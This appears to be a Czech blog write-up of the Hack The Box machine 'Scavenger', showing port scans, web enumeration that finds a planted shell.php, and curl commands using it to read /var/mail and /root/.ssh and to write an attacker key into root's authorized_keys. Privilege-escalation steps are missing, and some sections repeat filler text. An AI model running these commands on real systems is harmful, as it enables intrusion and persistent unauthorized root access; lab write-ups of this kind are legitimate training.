---
layout: post
author: Tomáš Matějíček
title: "Scavenger"
date: 2021-01-09
tags: linux rce ssh php exploit enumeration
---

## Úvod a kontext

Scavenger je stroj z Hack The Box. Dochované podklady zachycují jen část postupu, proto níže ponechávám pouze technicky doložitelné kroky a chybějící části výslovně označuji k ověření.

## Počáteční průzkum

### Vyhledání otevřených portů

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
```
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
| ssh-hostkey:
|   2048 df:94:47:03:09:ed:8c:f7:b6:91:c5:08:b5:20:e5:bc (RSA)
|   256 e3:05:c1:c5:d1:9c:3f:91:0f:c0:35:4b:44:7f:21:9e (ECDSA)
|_  256 45:92:c0:a1:d9:5d:20:d6:eb:49:db:12:a5:70:b7:31 (ED25519)
25/tcp open  smtp    Exim smtpd 4.89
| smtp-commands: ib01.supersechosting.htb Hello ib01.supersechosting.htb [10.10.14.9], SIZE 52428800, 8BITMIME, PIPELINING, PRDR, HELP,
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
43/tcp open  whois?
| fingerprint-strings:
|   GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest:
|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
|     This query returned 0 object
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
|_    1267 (HY000): Illegal mix of collations (utf8mb4_general_ci,IMPLICIT) and (utf8_general_ci,COERCIBLE) for operation 'like'
53/tcp open  domain  ISC BIND 9.10.3-P4 (Debian Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Debian
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-methods:
[... výstup zkrácen ...]
SF:\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20visit\x20http://ww
SF:w\.supersechosting\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20mix\x20of\x
SF:20collations\x20\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(utf8_genera
SF:l_ci,COERCIBLE\)\x20for\x20operation\x20'like'")%r(TLSSessionReq,103,"%
SF:\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\
SF:n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20visit\x20
SF:http://www\.supersechosting\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20mi
SF:x\x20of\x20collations\x20\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(ut
SF:f8_general_ci,COERCIBLE\)\x20for\x20operation\x20'like'");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Vyhledání otevřených portů (2)

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
nmap -sU -T4 -v $IP
```
```
=> http://www.supersechosting.htb/
```

### Enumerace webu

Ve webové vrstvě hledám neveřejné cesty, vývojové artefakty a chybně vystavené soubory, protože právě ty často prozradí technologii aplikace, interní workflow nebo přímo přístupové údaje.
```bash
./dirsearch.py -u http://sec03.rentahacker.htb/ -e php
```
```
=> sec03.rentahacker.htb/shell.php
```

## Získání přístupu

### Spuštění exploitu

V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
```bash
view-source:http://sec03.rentahacker.htb/shell.php?hidden=cat%20/var/mail/*
```

### Přihlášení na cíl

Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
```bash
curl "http://sec03.rentahacker.htb/shell.php?hidden=echo+\"g3tPr1v\"+>+/dev/ttyR0;ls+-alh+/root/.ssh/"
```

### Přihlášení na cíl (2)

Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
```bash
curl "http://sec03.rentahacker.htb/shell.php?hidden=echo+\"g3tPr1v\"+>+/dev/ttyR0;echo+\"ssh-rsa+AAAAB3NzaC1yc2EAAAADAQABAAACAQDBpuZ8%2BQR3hnONfIO2Y%2FvhoVRgVDpeOUrpxa%2BEOnRNhAV9%2FdYNoi%__CENSORED__%2BzcpGO0MLPiuEl78INxwii7y94CAn1gl%__CENSORED__%2FptFIFGVukajnihbK%2Fb3uWCDtaJcgaSILoSomouxjfXqmAwj%2FTaM0qHsT7K9NZsPfOB5ZAXa2spPR%2BAGsJUYviAkFDPvgSeRrf2g9QW37pYw0Vjl%__CENSORED__%2FtFVKaW0D5acreO4JBU9cl6MCwWONLkV5GTLHNAEzIsSAk4NJw%2BppfkBwBIs1Q%3D%3D+hack@t\"+>+/root/.ssh/authorized_keys"
```

### Získání user flagu

User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.

[POZNÁMKA K OVĚŘENÍ: V dostupném podkladu chybí konkrétní kroky pro získání uživatelského přístupu. Bez dalších artefaktů je nelze doplnit technicky přesně.]

## Eskalace oprávnění

### Získání root flagu

Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.

[POZNÁMKA K OVĚŘENÍ: V dostupném podkladu chybí konkrétní kroky pro eskalaci oprávnění a získání root přístupu. Bez dalších artefaktů je nelze doplnit technicky přesně.]

## Shrnutí klíčových poznatků

- Dochované podklady zachycují jen část postupu, proto jsou místa bez opory ve zdrojovém textu označena ověřovací poznámkou místo domněnek.
- Záměrně nedoplňuji neověřené detaily o exploitu, kredenciálech ani eskalaci; publikovatelná verze musí stát jen na dohledatelných krocích.
- Chybějící mezikroky mezi enumerací, potvrzením přístupu a finální eskalací zůstávají explicitně otevřené k doplnění z ověřených podkladů.

## Co si odnést do praxe

- Pro publikovatelný HTB write-up je nutné uložit i mezikroky mezi enumerací, hypotézou a potvrzením přístupu; samotné placeholdery nestačí.
- Pokud chybí výstupy nebo přesná argumentace, je lepší explicitně přiznat nejistotu než doplňovat neověřené technické detaily.
- Stejné techniky mají smysl pouze v laboratorním nebo jinak autorizovaném testovacím prostředí.
